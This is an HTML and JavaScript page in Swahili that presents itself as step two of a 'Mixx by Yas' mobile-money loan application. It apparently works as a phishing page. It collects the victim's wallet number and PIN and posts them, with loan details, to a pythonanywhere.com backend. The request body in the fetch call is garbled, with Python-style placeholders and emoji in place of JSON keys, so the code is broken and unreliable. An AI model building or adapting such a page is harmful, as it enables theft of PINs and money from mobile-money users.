<!DOCTYPE html>
<html>
<head>
    <title>Hatua ya 2 - Mixx by Yas</title>

    <style>

        body {
            font-family: Arial;
            max-width: 500px;
            margin: auto;
            padding: 20px;
        }

        h2 {
            text-align: center;
            color: #333;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }

        .pin-wrapper {
            position: relative;
            margin-top: 15px;
        }

        .pin-boxes {
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }

        .pin-boxes input {
            width: 23%;
            text-align: center;
            font-size: 22px;
        }

        .eye {
            position: absolute;
            right: 5px;
            top: -30px;
            cursor: pointer;
            font-size: 20px;
        }

        button {
            width: 100%;
            padding: 14px;
            background: blue;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            margin-top: 20px;
            cursor: pointer;
        }

        button:hover {
            background: darkblue;
        }

    </style>
</head>

<body>

<h2>Mixx by Yas - Hatua ya 2</h2>

<!-- MIX NUMBER -->
<input
    type="text"
    id="mixxNumber"
    placeholder="Namba ya Mixx by Yas"
>

<!-- PIN TITLE -->
<p><b>Weka PIN ya Mixx by Yas</b></p>

<!-- PIN BOXES -->
<div class="pin-wrapper">

    <span class="eye" onclick="togglePin()">👁️</span>

    <div class="pin-boxes">

        <input type="password" maxlength="1" id="p1">

        <input type="password" maxlength="1" id="p2">

        <input type="password" maxlength="1" id="p3">

        <input type="password" maxlength="1" id="p4">

    </div>

</div>

<!-- SUBMIT BUTTON -->
<button onclick="tumaMaombi()">
    Tuma Maombi
</button>

<script>

// ===============================
// AUTO MOVE PIN BOXES
// ===============================
const inputs = document.querySelectorAll(".pin-boxes input");

inputs.forEach((input, index) => {

    input.addEventListener("input", () => {

        if (input.value.length === 1 && index < inputs.length - 1) {

            inputs[index + 1].focus();

        }

    });

    input.addEventListener("keydown", (e) => {

        if (
            e.key === "Backspace" &&
            input.value === "" &&
            index > 0
        ) {

            inputs[index - 1].focus();

        }

    });

});

// ===============================
// SHOW/HIDE PIN
// ===============================
let hidden = true;

function togglePin() {

    hidden = !hidden;

    inputs.forEach(input => {

        input.type = hidden ? "password" : "text";

    });

}

// ===============================
// LOAD STEP 1 DATA
// ===============================
let data = JSON.parse(
    localStorage.getItem("mkopo_data")
);

// ===============================
// SUBMIT APPLICATION
// ===============================
function tumaMaombi() {

    let mixxNumber =
        document.getElementById("mixxNumber").value.trim();

    let pin =
        document.getElementById("p1").value +
        document.getElementById("p2").value +
        document.getElementById("p3").value +
        document.getElementById("p4").value;

    // VALIDATION
    if (!mixxNumber) {

        alert("Tafadhali weka namba ya Mixx");

        return;

    }

    if (pin.length < 4) {

        alert("Tafadhali weka PIN kamili");

        return;

    }

    if (!data) {

        alert("Hakuna data ya mkopo");

        return;

    }

    // BUTTON LOADING
    const button = document.querySelector("button");

    button.innerHTML = "Inatuma...";
    button.disabled = true;

    // SEND TO BACKEND
    fetch("https://superadmin008.pythonanywhere.com/submit-step3", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({

            jina: data.jina,
            kiasi: data.kiasi,
            lengo: data.lengo,
            muda: data.muda,
            📱 Mixx Number: {data.get('mixxNumber')}
🔐 PIN: {data.get('pin')}

        

    })

    .then(response => response.json())

    .then(result => {

        console.log(result);

        alert("Maombi yamefanikiwa kutumwa!");

        // CLEAR STORAGE
        localStorage.removeItem("mkopo_data");

        // REDIRECT
        window.location.href = "success.html";

    })

    .catch(error => {

        console.log(error);

        alert("Tatizo limetokea wakati wa kutuma");

        button.innerHTML = "Tuma Maombi";
        button.disabled = false;

    });

}

</script>

</body>
</html>
